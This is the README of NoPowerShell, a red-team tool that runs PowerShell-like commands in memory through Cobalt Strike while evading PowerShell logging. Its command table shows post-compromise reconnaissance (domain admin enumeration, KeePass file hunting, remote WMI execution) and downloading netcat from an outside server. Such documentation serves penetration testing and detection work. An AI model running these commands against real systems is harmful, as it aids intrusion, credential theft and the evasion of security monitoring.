# NoPowerShell
NoPowerShell is a tool implemented in C# which supports executing PowerShell-like commands while remaining invisible to any PowerShell logging mechanisms. This .NET Framework 2 compatible binary can be loaded in Cobalt Strike to execute commands in-memory. No `System.Management.Automation.dll` is used; only native .NET libraries. An alternative usecase for NoPowerShell is to launch it as a DLL via rundll32.exe: `rundll32 NoPowerShell.dll,main`.

This project makes it easy for everyone to extend its functionality using only a few lines of C# code. For more info, see [CONTRIBUTING.md](https://github.com/bitsadmin/nopowershell/blob/master/CONTRIBUTING.md).

Latest binaries available from the [Releases](https://github.com/bitsadmin/nopowershell/releases) page. Bleeding edge code available in the [DEV](https://github.com/bitsadmin/nopowershell/tree/dev) branch.

# Screenshots
## Running in Cobalt Strike
![NoPowerShell supported commands](https://raw.githubusercontent.com/bitsadmin/nopowershell/master/Pictures/CurrentlySupportedCommands.png "NoPowerShell in Cobalt Strike")
## Sample execution of commands
![NoPowerShell sample commands](https://raw.githubusercontent.com/bitsadmin/nopowershell/master/Pictures/SampleCommands.png "NoPowerShell in Cobalt Strike")
## Rundll32 version
![NoPowerShellDll via rundll32](https://raw.githubusercontent.com/bitsadmin/nopowershell/master/Pictures/NoPowerShellDll.png "NoPowerShellDll via rundll32")

# Why NoPowerShell
NoPowerShell is developed to be used with the `execute-assembly` command of Cobalt Strike.
Reasons to use NoPowerShell:
- Executes pretty stealthy
- Powerful functionality
- Provides the cmdlets you are already familiar with in PowerShell, so no need to learn yet another tool
- If you are not yet very familiar with PowerShell, the cmd.exe aliases are available as well (i.e. `ping` instead of `Test-NetConnection`)
- In case via `powerpick` or `powershell` cmdlets are not available, they _are_ available in `nps` (i.e. cmdlets from the ActiveDirectory module)
- Easily extensible with only a few lines of C#

# Usage
## Examples
| Action | Command | Notes |
| - | - | - |
| List all commands supported by NoPowerShell | `Get-Command` | |
| Get help for a command | `Get-Help -Name Get-Process` | Alternative: `man ps` |
| Show current user | `whoami` | Unofficial command |
| List SMB shares of MyServer | `Get-RemoteSmbShare \\MyServer` | Unofficial command |
| List all user groups in domain | `Get-ADGroup -Filter *` | |
| List all administrative groups in domain | `Get-ADGroup -LDAPFilter "(admincount=1)" \| select Name` | |
| List all properties of the Administrator domain user | `Get-ADUser -Identity Administrator -Properties *` | |
| List all Administrative users in domain | `Get-ADUser -LDAPFilter "(admincount=1)"` | |
| List all users in domain | `Get-ADUser -Filter *` | |
| List specific attributes of user | `Get-ADUser Administrator -Properties SamAccountName,ObjectSID` | |
| Show information about the current system | `Get-ComputerInfo` | |
| List all processes containing PowerShell in the process name | `Get-Process \| ? Name -Like *PowerShell*` | |
| List all active local users | `Get-LocalUser \| ? Disabled -EQ False` | |
| List all local groups | `Get-LocalGroup` | |
| List details of a specific group | `Get-LocalGroup Administrators` | |
| List all active members of the Administrators group | `Get-LocalGroupMember -Group Administrators \| ? Disabled -eq False` | |
| List all local users | `Get-LocalUser` | |
| List details of a specific user | `Get-LocalUser Administrator` | |
| List all properties of the DC01 domain computer | `Get-ADComputer -Identity DC01 -Properties *` | |
| List all Domain Controllers | `Get-ADComputer -LDAPFilter "(msDFSR-ComputerReferenceBL=*)"` | |
| List all computers in domain | `Get-ADComputer -Filter *` | |
| List specific attributes of user | `Get-ADComputer DC01 -Properties Name,operatingSystem` | |
| Copy file from one location to another | `copy C:\Tmp\nc.exe C:\Windows\System32\nc.exe` | |
| Copy folder | `copy C:\Tmp\MyFolder C:\Tmp\MyFolderBackup` | |
| Locate KeePass files in the C:\Users\ directory | `ls -Recurse -Force C:\Users\ -Include *.kdbx` | |
| List the keys under the SOFTWARE key in the registry | `ls HKLM:\SOFTWARE` | |
| View contents of a file | `Get-Content C:\Windows\WindowsUpdate.log` | |
| List autoruns in the registry | `Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run \| ft` | |
| List processes | `Get-Process` | |
| List processes on remote host | `Get-Process -ComputerName dc01.corp.local -Username Administrator -Password P4ssw0rd!` | |
| Gracefully stop processes | `Stop-Process -Id 4512,7241` | |
| Kill process | `Stop-Process -Force -Id 4512` | |
| Kill all cmd.exe processes | `Get-Process cmd \| Stop-Process -Force` | |
| Obtain data of Win32_Process class from a remote system and apply a filter on the output | `gwmi "Select ProcessId,Name,CommandLine From Win32_Process" -ComputerName dc01.corp.local \| ? Name -Like *PowerShell* \| select ProcessId,CommandLine` | Explicit credentials can be specified using the `-Username` and `-Password` parameters |
| View details about a certain service | `Get-WmiObject -Class Win32_Service -Filter "Name = 'WinRM'"` | |
| Launch process using WMI | `Invoke-WmiMethod -Class Win32_Process -Name Create "cmd /c calc.exe"` | This can also be done on a remote system |
| Delete a read-only file | `Remove-Item -Force C:\Tmp\MyFile.txt` | |
| Recursively delete a folder | `Remove-Item -Recurse C:\Tmp\MyTools\` | |
| Show all network interfaces | `Get-NetIPAddress -All` | |
| Show the IP routing table | `Get-NetRoute` | |
| List ARP cache | `Get-NetNeighbor` | Alternative: `arp` |
| Send 2 ICMP requests to IP address 1.1.1.1 with half a second of timeout | `Test-NetConnection -Count 2 -Timeout 500 1.1.1.1` | |
| Perform ping with maximum TTL specified | `ping -TTL 32 1.1.1.1` | |
| Perform a traceroute with a timeout of 1 second and a maximum of 20 hops | `Test-NetConnection -TraceRoute -Timeout 1000 -Hops 20 google.com` | |
| Check for open port | `tnc bitsadm.in -Port 80` | |
| List network shares on the local machine that are exposed to the network | `Get-SmbMapping` | |
| Format output as a list | `Get-LocalUser \| fl` | |
| Format output as a list showing only specific attributes | `Get-LocalUser \| fl Name,Description` | |
| Format output as a table | `Get-Process \| ft` | |
| Format output as a table showing only specific attributes | `Get-Process \| ft ProcessId,Name` | |
| Download file from the Internet | `wget http://myserver.me/nc.exe` | When compiled using .NET 2 only supports SSL up to SSLv3 (no TLS 1.1+) |
| Download file from the Internet specifying the destination | `wget http://myserver.me/nc.exe -OutFile C:\Tmp\netcat.exe` | |
| Count number of results | `Get-Process \| measure` | |
| Count number of lines in file | `gc C:\Windows\WindowsUpdate.log \| measure` | |
| Show only the Name in a file listing | `ls C:\ \| select Name` | |
| Show first 10 results of file listing | `ls C:\Windows\System32 -Include *.exe \| select -First 10 Name,Length` | |
| List all members of the "Domain Admins" group | `Get-ADGroupMember "Domain Admins"` | |
| Resolve domain name | `Resolve-DnsName microsoft.com` | Alternatives: `host linux.org`, `Resolve-DnsName -Type MX pm.me` |
| List local shares | `Get-WmiObject -Namespace ROOT\CIMV2 -Query "Select * From Win32_Share Where Name LIKE '%$'"` | Alternative: `gwmi -Class Win32_Share -Filter "Name LIKE '%$'"` |
| Show network interfaces | `Get-NetIPAddress` | Alternatives: `ipconfig`, `ifconfig` |
| Show computer information | `Get-ComputerInfo` | Alternative: `systeminfo` |
| List installed hotfixes | `Get-HotFix` | The output of this cmdlet together with the output of the `Get-ComputerInfo` cmdlet can be provided to [WES-NG](https://github.com/bitsadmin/wesng/) to determine missing patches |
| List local drives | `Get-PSDrive` | |
| Compress folder to zip | `Compress-Archive -Path C:\MyFolder -DestinationPath C:\MyFolder.zip` | Only available when compiled against .NET 4.5+ |
| Extract zip | `Expand-Archive -Path C:\MyArchive.zip -DestinationPath C:\Extracted` | Alternative: `unzip C:\MyArchive.zip`. Only available when compiled against .NET 4.5+ |

## Install in Cobalt Strike
1. Copy both `NoPowerShell.exe` and `NoPowerShell.cna` to the **scripts** subfolder of Cobalt Strike
2. Launch Cobalt Strike and load the `NoPowerShell.cna` script in the Script Manager
3. Interact with a beacon and execute commands using the `nps` command

## Launch via rundll32
1. Create a new shortcut to `NoPowerShell.dll` file (drag using right click -> Create shortcuts here)
2. Update the shortcut prefixing the filename with `rundll32` and appending `,main`
3. The shortcut will now look like `rundll32 C:\Path\to\NoPowerShell.dll,main`
4. Double click the shortcut

## Note
When using NoPowerShell from cmd.exe or PowerShell, you need to escape the pipe character (`|`) with respectively a caret (`^`) or a backtick (`` ` ``), i.e.:

- cmd.exe: `ls ^| select Name`
- PowerShell: ```ls `| select Name```

# Known issues
- Pipeline characters need to surrounded by spaces
- TLS 1.1+ is not supported by .NET Framework 2, so any site enforcing it will result in a connection error

# Improvements
- Fix above issues
- Improve stability by adding exception handling
- Support for parameter groups
- Add support for ArrayArgument parameter
- Add support for .NET code in commandline, i.e.: `[System.Security.Principal.WindowsIdentity]::GetCurrent().Name`

# Requested NoPowerShell cmdlets
| Cmdlet | Description |
| - | - |
| Get-ADTrusts | Unofficial command showing equivalent of `nltest /domain_trusts /all_trusts /v` |
| Get-QWinsta | Unofficial command showing equivalent of `qwinsta` / `query session` |
| Invoke-Command | Using PSRemoting execute a command on a remote machine (which in that case will of course be logged) |
| Get-Service | Include option to also show service paths like in `sc qc` |
| * | Sysinternals utilities like `pipelist` and `sdelete` |
| * | More \*-Item\* commands |
| * | More commands from the `ActiveDirectory` PowerShell module |

# Contributed NoPowerShell cmdlets
Authors of additional NoPowerShell cmdlets are added to the table below. Moreover, the table lists commands that are requested by the community to add. Together we can develop a powerful NoPowerShell toolkit!

| Cmdlet | Contributed by | GitHub | Twitter | Description |
| - | - | - | - | - |
|  |  |  |  |  |

# Included NoPowerShell cmdlets
| Cmdlet | Category | Notes |
| - | - | - |
| Get-ADGroup | ActiveDirectory | |
| Get-ADGroupMember | ActiveDirectory | |
| Get-ADUser | ActiveDirectory | |
| Get-ADComputer | ActiveDirectory | |
| Compress-Archive | Archive | Requires .NET 4.5+ |
| Expand-Archive | Archive | Requires .NET 4.5+ |
| Get-Whoami | Additional | whoami.exe /ALL is not implemented yet |
| Get-RemoteSmbShare | Additional | |
| Get-Command | Core | |
| Get-Help | Core | |
| Where-Object | Core | |
| Resolve-DnsName | DnsClient | |
| Get-LocalGroup | LocalAccounts | |
| Get-LocalGroupMember | LocalAccounts | |
| Get-LocalUser | LocalAccounts | |
| Copy-Item | Management | |
| Get-ChildItem | Management | |
| Get-Content | Management | |
| Get-ItemProperty | Management | |
| Get-Process | Management | |
| Stop-Process | Management | |
| Get-PSDrive | Management | |
| Get-WmiObject | Management | |
| Get-HotFix| Management | |
| Invoke-WmiMethod | Management | Quick & dirty implementation |
| Remove-Item | Management | |
| Get-ComputerInfo | Management | Few fields still need to be added to mimic systeminfo.exe |
| Get-NetIPAddress | NetTCPIP | |
| Get-NetRoute | NetTCPIP | |
| Test-NetConnection | NetTCPIP | |
| Get-NetNeighbor | NetTCPIP | No support for IPv6 yet |
| Get-SmbMapping | SmbShare | |
| Format-List | Utility | |
| Format-Table | Utility | |
| Invoke-WebRequest | Utility |
| Measure-Object | Utility |
| Select-Object | Utility |

# Acknowledgements
Various NoPowerShell cmdlets include code created by other developers. 
| Who | Website | Notes |
| Contributors of pinvoke.net | https://www.pinvoke.net/ | Various cmdlets use snippets from pinvoke |
| Michael Conrad | https://github.com/MichaCo/ | Parts of the Resolve-Dns cmdlet are based on the code of the DnsClient.Net project |
| Rex Logan | https://stackoverflow.com/a/1148861 | Most code of the Get-NetNeighbor cmdlet originates from his StackOverflow post |
| PowerShell developers | https://github.com/PowerShell/ | Code of NoPowerShell DLL is largely based on the code handling the console input of PowerShell |


**Authored by Arris Huijgen ([@bitsadmin](https://twitter.com/bitsadmin/) - https://github.com/bitsadmin/)**